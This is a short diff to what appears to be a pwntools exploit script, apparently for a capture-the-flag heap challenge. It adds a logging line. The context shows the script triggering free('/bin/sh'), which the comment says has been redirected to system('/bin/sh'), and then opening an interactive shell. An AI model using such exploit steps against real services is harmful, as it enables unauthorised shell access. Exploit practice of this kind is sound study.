@@ -117,5 +117,6 @@ if __name__ == "__main__":
 
     raw_input('after adding /bin/sh...')
     r.send('2\n1\n')                                    # delete_player() will try to free("/bin/sh") which becomes system("/bin/sh")
+    log.info('free("/bin/sh")..')
 
     r.interactive()
